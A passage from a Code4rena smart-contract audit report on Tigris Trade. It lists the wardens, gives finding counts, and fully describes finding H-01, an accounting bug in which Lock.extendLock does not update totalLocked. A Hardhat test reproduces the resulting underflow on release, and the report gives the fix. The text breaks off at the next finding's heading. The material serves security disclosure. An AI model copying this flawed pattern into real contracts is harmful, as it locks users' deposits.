{
  "circa": {
    "title": "Tigris Trade contest",
    "sponsor": "Tigris Trade",
    "slug": "2022-12-tigris",
    "date": "2023-02-17",
    "findings": "https://github.com/code-423n4/2022-12-tigris-findings/issues",
    "contest": 192
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Tigris Trade contest smart contract system written in Solidity. The audit contest took place between December 9—December 16 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>89 Wardens contributed reports to the Tigris Trade contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/0kage_eth\">0Kage</a></li>\n<li>0x4non</li>\n<li>0x52</li>\n<li>0xA5DF</li>\n<li><a href=\"https://decorativepineapple.github.io/\">0xDecorativePineapple</a></li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xbepresent</li>\n<li>0xdeadbeef0x</li>\n<li>0xhacksmithh</li>\n<li>0xmuxyz</li>\n<li><a href=\"https://github.com/alex-ppg\">0xsomeone</a></li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li>Avci (<a href=\"https://github.com/0xarshia\">0xArshia</a> and <a href=\"https://twitter.com/danialmomtahani\">0xdanial</a>)</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li><a href=\"https://twitter.com/bobface16\">Bobface</a></li>\n<li>Critical</li>\n<li>Deekshith99</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>Dinesh11G</li>\n<li>Englave</li>\n<li>Ermaniwe</li>\n<li><a href=\"https://twitter.com/farazsth98\">Faith</a></li>\n<li>HE1M</li>\n<li>HollaDieWaldfee</li>\n<li>IllIllI</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>JohnnyTime</li>\n<li>KingNFT</li>\n<li>Madalad</li>\n<li>Mukund</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li><a href=\"@sam_gmk\">SamGMK</a></li>\n<li>Secureverse (imkapadia, Nsecv and leosathya)</li>\n<li>SmartSek (0xDjango and hake)</li>\n<li>Tointer</li>\n<li>UniversalCrypto (amaechieth and tettehnetworks)</li>\n<li>__141345__</li>\n<li>ak1</li>\n<li>ali_shehab</li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>brgltd</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/carlitox477\">carlitox477</a></li>\n<li>cccz</li>\n<li>chaduke</li>\n<li>chrisdior4</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>debo</li>\n<li>eierina</li>\n<li>francoHacker</li>\n<li>fs0c</li>\n<li>gz627</li>\n<li><a href=\"https://twitter.com/gzeon\">gzeon</a></li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>hihen</li>\n<li>imare</li>\n<li>izhelyazkov</li>\n<li>jadezti</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>kaliberpoziomka8552</li>\n<li>koxuan</li>\n<li><a href=\"https://twitter.com/kevin_w_huo\">kwhuo68</a></li>\n<li>ladboy233</li>\n<li>minhtrng</li>\n<li>mookimgo</li>\n<li>noot</li>\n<li><a href=\"https://twitter.com/Zcropakx\">orion</a></li>\n<li>peanuts</li>\n<li><a href=\"https://twitter.com/real_philogy\">philogy</a></li>\n<li><a href=\"https://twitter.com/pwnforce\">pwnforce</a></li>\n<li>rbserver</li>\n<li>rotcivegaf</li>\n<li>rvierdiiev</li>\n<li>sha256yan</li>\n<li><a href=\"https://twitter.com/Stealthyzzzz\">stealthyz</a></li>\n<li>unforgiven</li>\n<li>wait</li>\n<li>yixxas</li>\n<li>yjrwkk</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/GalloDaSballo\">Alex the Entreprenerd</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/itsmetechjay\">itsmetechjay</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 35 unique vulnerabilities. Of these vulnerabilities, 11 received a risk rating in the category of HIGH severity and 24 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 12 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 7 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-12-tigris\">C4 Tigris Trade contest repository</a>, and is composed of 22 smart contracts written in the Solidity programming language and includes 2,477 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-11\" style=\"position:relative;\"><a href=\"#high-risk-findings-11\" aria-label=\"high risk findings 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (11)</h1>\n<h2 id=\"h-01-locksol-assets-deposited-with-lockextendlock-function-are-lost\" style=\"position:relative;\"><a href=\"#h-01-locksol-assets-deposited-with-lockextendlock-function-are-lost\" aria-label=\"h 01 locksol assets deposited with lockextendlock function are lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/23\">[H-01] Lock.sol: assets deposited with Lock.extendLock function are lost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/23\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/560\">sha256yan</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/558\">kaliberpoziomka8552</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/447\">0xsomeone</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/330\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/264\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/262\">ali_shehab</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/253\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/180\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/132\">csanuragjain</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The <code>Lock</code> contract (<a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10</a>) allows end-users to interact with bonds.</p>\n<p>There are two functions that allow to lock some amount of assets. The first function is <code>Lock.lock</code> (<a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76</a>) which creates a new bond. The second function is <code>Lock.extendLock</code> (<a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92</a>). This function extends the lock for some <code>_period</code> and / or increases the locked amount by some <code>_amount</code>.</p>\n<p>The issue is that the <code>Lock.extendLock</code> function does not increase the value in <code>totalLocked[_asset]</code>. This however is necessary because <code>totalLocked[_asset]</code> is reduced when <code>Lock.release</code> (<a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105</a>) is called.</p>\n<p>Therefore only the amount of assets deposited via <code>Lock.lock</code> can be released again. The amount of assets deposited using <code>Lock.extendLock</code> can never be released again because reducing <code>totalLocked[_asset]</code> will cause a revert due to underflow.</p>\n<p>So the amount of assets deposited using <code>Lock.extendLock</code> is lost.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>User A calls <code>Lock.lock</code> to lock a certain <code>_amount</code> (amount1) of <code>_asset</code> for a certain <code>_period</code>.</li>\n<li>User A calls then <code>Lock.extendLock</code> and increases the locked amount of the bond by some amount2</li>\n<li>User A waits until the bond has expired</li>\n<li>User A calls <code>Lock.release</code>. This function calculates <code>totalLocked[asset] -= lockAmount;</code>. Which will cause a revert because the value of <code>totalLocked[asset]</code> is only amount1</li>\n</ol>\n<p>You can add the following test to the <code>Bonds</code> test in <code>Bonds.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ReleaseUnderflow&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;release can cause underflow&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;110&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Lock 100 for 9 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;100&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">9</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Lock another 10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">extendLock</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">864000</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// Skip 10 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Try to release 110 after bond has expired -&gt; Underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">release</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<p>Run it with <code>npx hardhat test --grep \"release can cause underflow\"</code>.<br>\nYou can see that it fails because it causes an underflow.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add <code>totalLocked[_asset] += amount</code> to the <code>Lock.extendLock</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/23\">TriHaz (Tigris Trade) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1383078283\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown an issue with accounting that will cause principal deposits added via <code>extendLock</code> to be lost, for this reason I agree with High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1407130352\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419172200\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419172200</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-riskless-trades-due-to-delay-check\" style=\"position:relative;\"><a href=\"#h-02-riskless-trades-due-to-delay-check\" aria-label=\"h 02 riskless trades due to delay check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 